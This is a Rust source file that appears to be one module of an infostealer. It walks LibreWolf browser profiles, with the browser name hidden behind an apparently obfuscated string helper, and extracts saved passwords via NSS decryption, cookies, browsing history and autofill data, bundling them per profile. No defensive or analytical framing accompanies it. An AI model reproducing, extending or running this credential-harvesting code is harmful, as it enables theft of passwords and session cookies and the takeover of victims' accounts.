use super::base;
use super::{get_browsers, find_nss_dir};

pub fn extract() -> Vec<(String, String)> {
    let mut results = Vec::new();
    for browser in get_browsers() {
        if browser.name != crate::encrypted::s_gck_librewolf() {
            continue;
        }
        if !browser.profiles_path.exists() { continue; }
        let nss_dir = find_nss_dir(&browser.name);
        let profiles = base::get_profiles(&browser.profiles_path);

        for (profile_name, profile_path) in profiles {
            let passwords = nss_dir.as_ref()
                .and_then(|dir| base::extract_passwords_nss(&profile_path, dir));
            let cookies = base::extract_cookies(&profile_path);
            let history = base::extract_history(&profile_path);
            let autofill = base::extract_autofill(&profile_path);

            crate::browsers::common::zipp::push_profile_bundle(
                &mut results, &browser.name, &profile_name,
                passwords, cookies, autofill, history,
            );
        }
    }
    results
}
